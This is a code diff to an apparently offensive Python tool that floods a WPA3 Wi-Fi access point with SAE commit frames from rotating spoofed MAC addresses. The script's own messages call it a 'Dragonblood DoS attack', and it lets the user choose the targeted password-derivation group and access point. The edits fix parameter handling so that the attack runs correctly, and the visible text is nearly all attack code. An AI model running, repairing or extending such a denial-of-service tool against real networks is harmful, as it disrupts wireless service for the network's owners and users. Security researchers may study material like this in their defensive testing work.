@@ -88,7 +88,7 @@ def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10)
         i += 1
         if i == len(random_macs):
             i = 0
-        
+
         frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src,cookie=None, status=pwe)
         transmitData(frame_bytes)
         if src not in specific_frame:
@@ -98,7 +98,7 @@ def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10)
     return int(duration/60), rate, mac_no
 
 def start_dos(params):
-    if params < 4:
+    if len(params) < 4:
         print("Invalid number of parameters for Dragonblood DoS attack.")
         return
     
@@ -106,7 +106,7 @@ def start_dos(params):
     #start threading
     print("which password derivation (PWE) do you want to target: (0 or 126)")
     #pwe = int(input("PWE: "))
-    pwe = params[0]
+    pwe = int(params[0])
     
     print("which mac do you want to target (leave empty for default AP MAC): ")
     # target = input("MAC: ")
